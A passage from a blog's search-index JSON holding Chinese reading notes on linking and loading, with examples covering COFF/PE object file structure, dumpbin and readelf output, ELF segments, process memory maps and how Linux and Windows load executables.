principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"PE的前身-COFF 还是使用最开始那个Hello.c的例子 //Hello.c #include\u003cstdio.h\u003e void fun1(); int gloabl_init_var = 666; int global_uninit_var; int main(void){ static int static_init_var = 999; static int static_uninit_var; int a = 1; int b; printf(\"Hello\\n\"); fun1(); return 0; } void fun1(){} 使用CL编译器，这里用的是VS2022中下载的相关工具，而非书中介绍的 $ CL /c /Za Hello.c /c表示只编译不链接，/Za表示禁用语言扩展 和GUN的工具链中的objdump一样，这里也有一个类似的工具，就是dumpbin $ dumpbin /ALL .\\Hello.obj \u003e Hello.txt /ALL表示打印目标文件的所有相关信息，也可以使用/SUMMARY选项查看基本信息 $ dumpbin /SUMMARY .\\Hello.obj Microsoft (R) COFF/PE Dumper Version 14.34.31937.0 Copyright (C) Microsoft Corporation. All rights reserved. Dump of file .\\Hello.obj File Type: COFF OBJECT Summary 70 .chks64 B .data 78 .debug$S 18 .drectve 24 .pdata D6 .text$mn 18 .xdata ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:17:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"COFF文件结构 COFF文件的文件头包含了两部分，一个是描述文件总体结构和属性的映像头 (Image Header)，另一个是描述该文件包含的段属性的段表 (Section Table)。 映像 (Image)：因为PE文件在装载时被直接映射到进程的虚拟空间中运行，它时进程的虚拟空间的映像。所以PE可执行文件很多时候被叫做映像文件 (Image File)。 Image Header IMAGE_FILE_HEADER Section Table IMAGE_SECTION_HEADER[] .text .data .drectve .debug$S … Symbol Table 我并不想画图，所以用表格展示了，自然第一个空着的那样是应该省略的。 文件头里面描述COFF总体属性的映像头时一个IMAGE_FILE_HEADER的结构，和ELF中的Elf64_Ehdr作用相同。在微软SDK目录下的winnt.h文件中可以找到相关定义 typedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; 对照dumpbin产生的txt文件，会发现这个结构和文本中FILE HEADER VALUES是对应的。 ... Dump of file .\\Hello.obj File Type: COFF OBJECT FILE HEADER VALUES 8664 machine (x64) E number of sections 63D72E72 time date stamp Mon Jan 30 10:41:54 2023 50B file pointer to symbol table 33 number of symbols 0 size of optional header 0 characteristics ... 可以看到目标文件类型是COFF OBJECT，文件头包含了目标机器类型，这里是0X8664，同样在winnt.h文件中可以看到关于这些值的定义 下面小截取一手0x8664的定义，还有很多平台就不都拿过来了。 #define IMAGE_FILE_MACHINE_AMD64 0x8664 // AMD64 (K8) time date stamp表示PE文件的创建时间。file pointer to symbol table表示符号表在PE中的位置。size of optional header指的是Optional Header的大小，这个结构只存在于PE文件，COFF目标文件中不存在该结构，所以为0。 映像头后面紧跟着的就是COFF文件的段表，它是一个类型为IMAGE_SECTION_HEADER结构的数组，数组里面每个元素代表一个段，和ELF中Elf64_Shdr类似。它也被定义在winnt.h中。 #define IMAGE_SIZEOF_SHORT_NAME 8 typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 可以看到每个段所拥有的属性包括段名、物理地址、虚拟地址、原始数据大小、段在文件中的位置、该段的重定位表在文件中的位置、该段的行号表在文件中的位置、标志位等。 字段 含义 VirtualSize 该段被加载至内存后的大小 VirtualAddress 该段被加载至内存后的虚拟地址 SizeOfRawData 该段在文件中的大小 Characteristics 段的属性 SizeOfRawData的值可能和VirtualSize不一样，比如.bss段的SizeOfRawData会是0，而VirtualSize值是.bss段的大小。另外涉及到内存对齐等问题，前者的值往往要比后者小 段的属性主要包含段的类型（代码、数据、bss）、对齐方式及权限。 段表后就是具体段的内容了，由于介绍过和COFF相似的ELF的一些段，所以下面只介绍ELF中不存在的段，.debug$S段和.drectve段。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:17:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"链接指示信息 SECTION HEADER #1 .drectve name 0 physical address 0 virtual address 18 size of raw data 244 file pointer to raw data (00000244 to 0000025B) 0 file pointer to relocation table 0 file pointer to line numbers 0 number of relocations 0 number of line numbers 100A00 flags Info Remove 1 byte align RAW DATA #1 00000000: 20 20 20 2F 44 45 46 41 55 4C 54 4C 49 42 3A 22 /DEFAULTLIB:\" 00000010: 4C 49 42 43 4D 54 22 20 LIBCMT\" Linker Directives ----------------- /DEFAULTLIB:LIBCMT 上面的就是Hello.txt中关于.drectve段相关的内容。drectve实际上是directive的缩写，它的内容是编译器传递给链接器的指令，即编译器告诉链接器该如何链接这个目标文件。段名后面就是段的属性，包括地址、长度、位置等属性，最后一个属性是flags，也就是IMAGE_SECTION_HEADER中的Characteristics成员，.drectve段的标志位是0x100A00。 标志位 宏定义 意义 0x00100000 IMAGE_SCN_ALIGN_1BYTES 1字节对齐。相当于不对齐 0x00000800 IMAGE_SCN_LNK_REMOVE 最终链接成映像文件的时候抛弃该段 0x00000200 IMAGE_SCN_LNK_INFO 该段包含的是注释或其他信息 dumpbin打印了标志位的三个组合属性：Info、Remove、 1 byte align。即该段是信息段，而非程序数据；该段在最后链接成可执行文件的时候被抛弃；该段在文件中对齐方式是一字节对齐。 紧随其后的是该段在文件中的原始数据（RAW DATA #1）。dumpbin知道这个段是.drectve段，并对该段的内容进行解析，结果就是/DEFAULTLIB:LIBCMT这条链接指令。这就是CL编译器希望传递给link链接器的参数。该参数表示这个目标文件需要LIBCMT这个默认库。 LIBCMT全程Library C Multitheared，静态链接的多线程C库。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:18:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"调试信息 COFF文件中以.debug开头的段都包含着调试信息。比如.debug$S表示包含的是符号相关的调试信息段；debug$P表示包含预编译头文件相关的调试信息段；.debug$T表示包含类型相关的调试信息段。 在Hello.obj中只看到了.debug$S段，可以在该段的文本信息看到目标文件的绝对路径、编译器信息等。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:19:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"符号表 Hello.txt最后部分就是COFF符号表，COFF符号表包含的内容几乎和ELF文件的符号表是一致的，主要就是符号名、符号类型、所在位置。 COFF SYMBOL TABLE 000 01047CC1 ABS notype Static | @comp.id 001 80010190 ABS notype Static | @feat.00 002 00000002 ABS notype Static | @vol.md 003 00000000 SECT1 notype Static | .drectve Section length 18, #relocs 0, #linenums 0, checksum 0 005 00000000 SECT2 notype Static | .debug$S Section length 78, #relocs 0, #linenums 0, checksum 0 007 00000000 SECT3 notype Static | .data Section length B, #relocs 0, #linenums 0, checksum 84C66A7A 009 00000000 SECT3 notype External | gloabl_init_var 00A 00000004 UNDEF notype External | global_uninit_var 00B 00000000 SECT4 notype Static | .text$mn Section length 34, #relocs 3, #linenums 0, checksum F819F81E 00D 00000000 SECT5 notype Static | .text$mn Section length 8, #relocs 1, #linenums 0, checksum 411950D3, selection 2 (pick any) 00F 00000000 SECT6 notype Static | .text$mn Section length 43, #relocs 2, #linenums 0, checksum 2D481083, selection 2 (pick any) 011 00000000 SECT7 notype Static | .text$mn Section length 57, #relocs 2, #linenums 0, checksum 41BAE1CE, selection 2 (pick any) 013 00000000 SECT5 notype () External | __local_stdio_printf_options 014 00000000 UNDEF notype () External | __acrt_iob_func 015 00000000 UNDEF notype () External | __stdio_common_vfprintf 016 00000000 SECT6 notype () External | _vfprintf_l 017 00000000 SECT7 notype () External | printf 018 00000000 SECT4 notype () External | fun1 019 00000010 SECT4 notype () External | main 01A 00000000 SECT6 notype Label | $LN3 01B 00000000 SECT7 notype Label | $LN3 01C 00000010 SECT4 notype Label | $LN3 01D 00000000 SECT8 notype Static | .xdata Section length 8, #relocs 0, #linenums 0, checksum 8D3961AC, selection 5 (pick associative Section 0x6) 01F 00000000 SECT8 notype Static | $unwind$_vfprintf_l 020 00000000 SECT9 notype Static | .pdata Section length C, #relocs 3, #linenums 0, checksum A712C50E, selection 5 (pick associative Section 0x6) 022 00000000 SECT9 notype Static | $pdata$_vfprintf_l 023 00000000 SECTA notype Static | .xdata Section length 8, #relocs 0, #linenums 0, checksum 8D3961AC, selection 5 (pick associative Section 0x7) 025 00000000 SECTA notype Static | $unwind$printf 026 00000000 SECTB notype Static | .pdata Section length C, #relocs 3, #linenums 0, checksum 5FE3FADF, selection 5 (pick associative Section 0x7) 028 00000000 SECTB notype Static | $pdata$printf 029 00000000 SECTC notype Static | .xdata Section length 8, #relocs 0, #linenums 0, checksum 37887F31 02B 00000000 SECTC notype Static | $unwind$main 02C 00000000 SECTD notype Static | .pdata Section length C, #relocs 3, #linenums 0, checksum 7D3C6CAC 02E 00000000 SECTD notype Static | $pdata$main 02F 00000008 UNDEF notype External | ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 (`__local_stdio_printf_options'::`2'::_OptionsStorage) 030 00000004 SECT3 notype Static | $SG9830 031 00000000 SECTE notype Static | .chks64 Section length 70, #relocs 0, #linenums 0, checksum 0 String Table Size = 0x10B bytes 输出结果最左列是符号编号，接着是符号的大小，第三列是符号所在的位置。ABS (Absolute)表示符号是个绝对值，即一个常量，它不存在于任何段中；SECT1 (SECT#1)表示符号对于的对象定义在文件中第一个段中；UNDEF表示未定义，即该符号定义在其他目标文件。第四列是符号类型，对于C语言来说，COFF只区分两种，一种是变量和其他符号，叫notype，另一种是函数，叫notype()，该符号类型值可以用于其他一些需要强符号类型的语言或系统中，可以给链接器更多的信息来识别符号的类型。第五列是符号的可见范围，Static是局部，External是全局。最后一列是符号名，对于需要符号修饰的，dumpbin会把修饰前后的名字都打印出来，括号内的就是修饰前的。如果dumpbin发现这个符号是段名，还会解析这个段的基本属性：段长度、重定位数、行号数以及校验和。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:20:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"PE PE相较于COFF的主要变化由两个 文件最开始的部分不是COFF文件头，而是DOS MZ可执行文件格式的文件头和桩代码 原有的IMAGE_FILE_HEADER扩展成IMAGE_NT_HEADERS，该结果在原有基础上新转增了PE扩展头部结构。 由于历史原因，PE文件设计为了兼容DOS系统，还存在Image DOS Header和DOS Stub两个结构。 Image_DOS_HEADER结构也被定义在winnt.h里面。该结构的e_lfanew成员表明了PE文件头在PE文件中的偏移。这个成员在DOS的可执行文件格式中永远为0，所以Windows执行可执行文件时会先判断这个成员是否为0，如果为0就启用DOS子系统。 IMAGE_NT_HEADERS是PE文件真正的文件头，它包含一个标记和两个结构体。标记是一个常量，对于合法的PE文件来说，值永远是0x00004550，按照小端字节序，对应的是’P’、‘E’、’\\0’、’\\0’四个字符的ASCII码。文件头包含的两个结构分别是映像头和PE扩展头部结构 typedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; 64位Windows编译默认定义_WIN64这个宏，一些符号的名字也会被定义成别的，比如： The actual structure in WinNT.h is named IMAGE_NT_HEADERS32 and IMAGE_NT_HEADERS is defined as IMAGE_NT_HEADERS32. However, if _WIN64 is defined, then IMAGE_NT_HEADERS is defined as IMAGE_NT_HEADERS64. IMAGE_NT_HEADERS64 structure (winnt.h) Image_FILE_HEADER在前面介绍过了，这里新出现的就是PE扩展头部结构。 typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64; 这里有很多成员，有些和PE文件的装载和运行有关。这里只挑一些和静态链接相关的介绍。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:21:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"PE数据目录 Windows系统装载PE可执行文件时，往往需要很快找到一些装载所需要的数据结构，比如导入表、导出表等。这些常用的数据和长度都被保存在了一个叫数据目录的结构里面，它就是IMAGE_OPTIONAL_HEADER64结构里面的DataDirectory成员。该成员是一个IMAGE_DATA_DIRECTORY结构的数组，相关定义如下： typedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; #define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16 DataDirectory数组里面每个元素对应包含一个表，winnt.h中定义了一些以IMAGE_DIRECTORY_ENTRY_开头的宏。 #define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory 从上面的代码可以看出，数组第一个元素所包含的地址和长度就是导出表所在的地址和长度。 ","date":"2022-10-30","objectID":"/posts/op_power-static-link/:21:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：静态链接","uri":"/posts/op_power-static-link/"},{"categories":null,"content":"程序员的自我修养：链接、装载与库这本书的读书笔记","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"程序员的自我修养：链接、装载与库这本书的读书笔记 可执行文件的装载与进程 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:0:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"进程虚拟地址空间 程序运行起来之后拥有自己的虚拟地址空间，其大小由CPU的位数决定。C语言指针所占空间可以判断虚拟地址空间的大小，32位平台下的指针是32位，也就是4字节；64位平台下的指针是64位，即8字节。历史上指针曾经分为长指针、短指针和近指针，这是为了应对当时处理器而设计的，现在可以不再考虑。 以32位为例： Linux平台的虚拟地址空间操作系统要占用1G，Windows默认占用2G（但可以改成1G）。 Intel在95年采用了36位的物理地址，更改了页映射的方式使得能够访问高达64GB的物理内存，这个地址扩展方法叫做PAE（Physical Address Extension）。 扩展的物理地址空间无法被普通的应用程序感受到。操作系统提供了一种窗口映射的方法，把额外的内存映射到进程地址空间中，应用程序可以根据需求选择申请和映射。比如程序从0x10000000~0x20000000这一段256MB的虚拟地址空间作为窗口，程序可以从高4GB的物理空间申请多个大小为256MB的物理空间，根据需求将窗口映射到某个物理空间块。 Windows下这个访问内存的操作方式叫做AWE（Address Windowing Extensions），Linux可以通过mmap()系统调用来实现。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:1:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"装载的方式 最简单是静态装入的方法就是将程序运行所需要的指令和数据全部装入内存。但很多时候程序所需的内存大于物理内存，于是有了动态装入，即将程序最常用的部分常驻内存，不常用的数据放在磁盘里。 覆盖装入和页映射是典型的动态装载的方法。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:2:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"覆盖装入 覆盖装入在虚拟存储没有出现之前使用广泛，现在已经被淘汰了。 覆盖装入把压力转移到了程序员这边，程序员需要手动把程序封装成若干个块，再写一个辅助代码来管理这些块。比如main函数会调用A或者B，就可以main调用A的时候把A载入，调用B的时候用B覆盖掉A的位置。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:2:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"页映射 将内存和磁盘中的数据和指令按照页为单位来划分。执行程序某个页的时候将页载入内存的某个页，如果都满了就利用相关算法放弃一个页。这就是主流操作系统装载可执行文件的方式了。如果程序需要内存中没有载入的页，硬件会捕获这个信息，就是所谓的页错误 (Page Fault)，然后操作系统接管进程，负责将没有载入的页载入并建立映射关系。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:2:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"操作系统角度看可执行文件的装载 有了现在硬件的地址转换和页映射的机制，操作系统动态加载可执行文件和静态加载有了很大的区别。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:3:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"进程的建立 一个进程的关键的特征是它拥有独立的虚拟地址空间，这让它有别去其他进程。下面是常见建立进程的情况： 创建一个独立的虚拟地址空间。 读取可执行文件头，建立虚拟空间和可执行文件的映射关系。 将CPU指令寄存器设置成可执行文件的入口地址，启动运行。 创建虚拟地址空间 虚拟地址空间实际上由一组映射函数将虚拟空间的各个页映射到相应的物理空间，创建一个虚拟空间实际上不是创建空间而是创建映射函数所需要的相应的数据结构。在i386的Linux下，创建这个只是分配一个页目录即可，页映射关系等是后续再进行设置。 读取可执行文件头，并建立虚拟空间和可执行文件的映射关系 上面一步的页映射关系函数是虚拟内存到物理内存的映射关系，这一步所做的是虚拟空间与可执行文件的映射关系。当程序发生页错误时，操作系统将会从物理内存中分配一个物理页，然后将该页从磁盘读取到内存中，再设置这个虚拟页和物理页的映射关系。当操作系统捕获到页错误时，它需要知道程序所需的页再可执行文件的哪个位置。这就是虚拟空间和可执行文件之间的映射关系。 Linux中将进程虚拟空间的一个段叫做虚拟内存区域（VMA），Windows下叫虚拟段。 将CPU指令寄存器设置成可执行文件的入口地址，启动运行 操作系统通过设置CPU指令寄存器将控制权转交给进程，进程由此开始执行。 这一步看似简单，再操作系统层面上比较复杂，它涉及到内核堆栈和用户堆栈的切换、CPU运行权限的切换。不过从进程的角度来看，这一步就是操作系统执行了一条跳转到可执行文件入口地址的调转指令。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:3:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"进程虚存空间分布 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:4:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"ELF文件链接视图 ELF文件被映射时，以系统的页长度作为映射单位。每个段被映射时的长度都是系统页长度的整数倍，如果不是，多余的部分也将占用一个页。 为了节省空间，ELF文件装载的时候将相同权限的段合并一起当作一个段来进行映射，这样的段概念上叫Segment。从链接的角度来看，ELF文件按照Section存储，从装载的角度来看，ELF文件按照Segment划分。 readelf可以查看ELF的Segment，正如描述Section属性的结构叫段表，描述Segment的结构叫程序头 readelf -l \u003cfilename\u003e 以一个循环执行sleep的程序为例 ///sleepc.c: #include \u003cstdlib.h\u003e int main(void){ while (1) { sleep(1000); } return 0; } $ gcc -static sleepc.c -o sleepc.elf $ readelf -S sleepc.elf There are 32 section headers, starting at offset 0xbcd50: Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .note.gnu.pr[...] NOTE 0000000000400270 00000270 0000000000000040 0000000000000000 A 0 0 8 [ 2] .note.gnu.bu[...] NOTE 00000000004002b0 000002b0 0000000000000024 0000000000000000 A 0 0 4 [ 3] .note.ABI-tag NOTE 00000000004002d4 000002d4 0000000000000020 0000000000000000 A 0 0 4 [ 4] .rela.plt RELA 00000000004002f8 000002f8 0000000000000240 0000000000000018 AI 29 20 8 [ 5] .init PROGBITS 0000000000401000 00001000 000000000000001b 0000000000000000 AX 0 0 4 [ 6] .plt PROGBITS 0000000000401020 00001020 0000000000000090 0000000000000000 AX 0 0 8 [ 7] .text PROGBITS 00000000004010c0 000010c0 0000000000079333 0000000000000000 AX 0 0 64 [ 8] __libc_freeres_fn PROGBITS 000000000047a400 0007a400 0000000000000ab2 0000000000000000 AX 0 0 16 [ 9] .fini PROGBITS 000000000047aeb4 0007aeb4 000000000000000d 0000000000000000 AX 0 0 4 [10] .rodata PROGBITS 000000000047b000 0007b000 000000000001bc84 0000000000000000 A 0 0 32 [11] .stapsdt.base PROGBITS 0000000000496c84 00096c84 0000000000000001 0000000000000000 A 0 0 1 [12] .eh_frame PROGBITS 0000000000496c88 00096c88 000000000000b2d8 0000000000000000 A 0 0 8 [13] .gcc_except_table PROGBITS 00000000004a1f60 000a1f60 00000000000000f6 0000000000000000 A 0 0 1 [14] .tdata PROGBITS 00000000004a3778 000a2778 0000000000000018 0000000000000000 WAT 0 0 8 [15] .tbss NOBITS 00000000004a3790 000a2790 0000000000000048 0000000000000000 WAT 0 0 8 [16] .init_array INIT_ARRAY 00000000004a3790 000a2790 0000000000000008 0000000000000008 WA 0 0 8 [17] .fini_array FINI_ARRAY 00000000004a3798 000a2798 0000000000000008 0000000000000008 WA 0 0 8 [18] .data.rel.ro PROGBITS 00000000004a37a0 000a27a0 0000000000003768 0000000000000000 WA 0 0 32 [19] .got PROGBITS 00000000004a6f08 000a5f08 00000000000000d8 0000000000000000 WA 0 0 8 [20] .got.plt PROGBITS 00000000004a6fe8 000a5fe8 00000000000000a8 0000000000000008 WA 0 0 8 [21] .data PROGBITS 00000000004a70a0 000a60a0 00000000000019f8 0000000000000000 WA 0 0 32 [22] __libc_subfreeres PROGBITS 00000000004a8a98 000a7a98 0000000000000048 0000000000000000 WAR 0 0 8 [23] __libc_IO_vtables PROGBITS 00000000004a8ae0 000a7ae0 0000000000000768 0000000000000000 WA 0 0 32 [24] __libc_atexit PROGBITS 00000000004a9248 000a8248 0000000000000008 0000000000000000 WAR 0 0 8 [25] .bss NOBITS 00000000004a9260 000a8250 0000000000005800 0000000000000000 WA 0 0 32 [26] __libc_freer[...] NOBITS 00000000004aea60 000a8250 0000000000000020 0000000000000000 WA 0 0 8 [27] .comment PROGBITS 0000000000000000 000a8250 000000000000001b 0000000000000001 MS 0 0 1 [28] .note.stapsdt NOTE 0000000000000000 000a826c 00000000000014d8 0000000000000000 0 0 4 [29] .symtab SYMTAB 0000000000000000 000a9748 000000000000c0d8 0000000000000018 30 767 8 [30] .strtab STRTAB 0000000000000000 000b5820 00000000000073d9 0000000000000000 0 0 1 [31] .shstrtab STRTAB 0000000000000000 000bcbf9 0000000000000157 0000000000000000 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), R (retain), D (mbind), l (large), p (processor specific) 通过readelf可以看到该文件section的数量，也可以查看segment的数量。正如描述section属性的结构叫段表，描述segment的结构叫程序头，它描述了ELF文件该如何被操作系统映射到进程的虚拟空间 $ readelf -l sleepc.elf Elf file type is EXEC (Executable file) Entry point 0x4014e0 There","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:4:1","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"堆和栈 VMA除了被用来映射可执行文件的segment之外还有其他作用。Linux下，可以通过查看/proc以查看进程的虚拟空间分布 $ ./sleepc.elf \u0026 $ ps PID TTY TIME CMD 1039 pts/1 00:00:00 fish 1241 pts/1 00:00:00 sleepc.elf 1247 pts/1 00:00:00 ps $ cat /proc/1241/maps 00400000-00401000 r--p 00000000 00:17 144115 /home/suoyuan/test/sleepc.elf 00401000-0047b000 r-xp 00001000 00:17 144115 /home/suoyuan/test/sleepc.elf 0047b000-004a3000 r--p 0007b000 00:17 144115 /home/suoyuan/test/sleepc.elf 004a3000-004a7000 r--p 000a2000 00:17 144115 /home/suoyuan/test/sleepc.elf 004a7000-004aa000 rw-p 000a6000 00:17 144115 /home/suoyuan/test/sleepc.elf 004aa000-004af000 rw-p 00000000 00:00 0 01cb9000-01cdb000 rw-p 00000000 00:00 0 [heap] 7ffc9bf89000-7ffc9bfaa000 rw-p 00000000 00:00 0 [stack] 7ffc9bfd9000-7ffc9bfdd000 r--p 00000000 00:00 0 [vvar] 7ffc9bfdd000-7ffc9bfdf000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall] 上面的输出中，第一列是VMA的地址范围，第二列是VMA的权限，第三列是偏移（VMA对应的segment再映像文件中的偏移），第四列表示映像文件所在设备的主设备号和次设备号，第五列表示映像文件的节点号，最后一列是映像文件的路径。 其中主次设备号和节点号都为0的表明它们没有被映射到文件中，这种VMA叫做匿名虚拟内存区域。 一个进程基本有如下几种VMA： 代码VMA，可读可执行，有映像文件 数据VMA，可读可写不可执行，有映像文件 堆VMA，可读可写不可执行，无映像文件，匿名，可向上扩展 栈VMA，可读可写不可执行，无映像文件，匿名，可向下扩展 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:4:2","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"段地址对齐 很多时候段的大小没有不是页的大小的整数倍，存在空间上的浪费。Unix采取段对齐的方案来解决这一问题。 段对齐就是把各个段接壤的部分共享一个物理页面，然后将物理内存分别映射两次，如下图： 由图可知，段合并使得ELF文件再物理内存上被分为了以页大小为单位的若干个块，但并没有改变进程虚拟空间。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:4:3","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"进程栈初始化 进程刚启动的时候需要知道进程运行的环境（环境变量和运行时参数），常见做法是把操作系统在进程启动前把这些信息提前保存到进程的虚拟空间的栈中。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:4:4","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"Linux内核装载ELF简介 用户层面，bash进程调用fork()系统调用创建新进程，新进程调用execve()系统调用执行指定的ELF文件，原先的bash进程等待新进程结束，继续等待用户输入命令。 进入execve()系统调用之后，Linux内核正式开始装载工作。内核中，execve()系统调用的相应入口是sys_execve()，sys_execve()进行一些参数的检查复制之后调用do_execve()，do_execve()首先查找被执行的文件，若找到文件则读取文件前128个字节以判断可执行文件的格式（ELF、a.out、Java程序、脚本程序等等），每个可执行文件的开头字节都是特殊的，尤其是前4个字节，被称为magic number。 do_execve()读取了前128字节之后调用search_binary_handle()搜索匹配合适的可执行文件装载处理过程，search_binary_handle()通过判断文件头部magic number确定文件的格式并调用相应的装载处理过程（比如ELF的叫load_elf_binary()，a.out的叫load_aout_binary，可执行脚本叫load_script()）下述步骤是ELF可执行文件的装载： 检查ELF可执行文件格式的有效性，比如magic number、程序头表中segment的数量 寻找动态链接的.interp段，设置动态链接器路径 根据ELF可执行文件的程序头表的描述，对ELF文件进行映射 初始化ELF进程环境 将系统调用的返回地址修改成ELF可执行文件的入口点。入口点取决于链接方式，静态是e_entery的地址，动态则是动态链接器 当load_elf_binary()执行完毕，返回至do_execve()再返回到sys_execve()时，上述步骤的第5步已经把系统调用的地址修改。当sys_execve()系统调用从内核态返回到用户态时，EIP寄存器直接跳转到ELF程序的入口地址。 ","date":"2022-10-26","objectID":"/posts/op_power-dymic-load/:5:0","tags":["readding notes","compilation principle"],"title":"程序员的自我修养：动态链接","uri":"/posts/op_power-dymic-load/"},{"categories":null,"content":"Windows PE的装载简介 PE的段的数量一般很少，其在链接器生成可执行文件的时候将所有的段尽可能的合并，一般只有代码段、数据段、只读数据段和BSS段等为数不多的段。PE文件所有段的起始地址都是页的倍数，段的长度如果不是页的整数倍，映射时向上补齐到页的整数倍，所以它没有ELF段地址对齐等问题。 PE里常见术语RVA（Relative Virtual Address）相对虚拟地址，类似于偏移量的一个概念。每个PE文件装载的时候都有一个装载目标地址，也就是所谓的基地址。PE被设计成可以装载到任何地址，所以基地址并不固定。 装载PE的简单过程： 读取文件的第一个页。这个页包含了DOS头，PE文件头和段表 检查进程地址空间中目标地址是否可用，若不可用就换。可执行文件基本无法遇到被占用的问题，因为往往它是第一个被载入的模块，这是针对DLL文件的装载来说的 使用段表提供的信息，将PE文件所有的段一一映射到地址空间 如果装载地址不是目标地址，进行Rebasing 装载PE文件所需的DLL文件 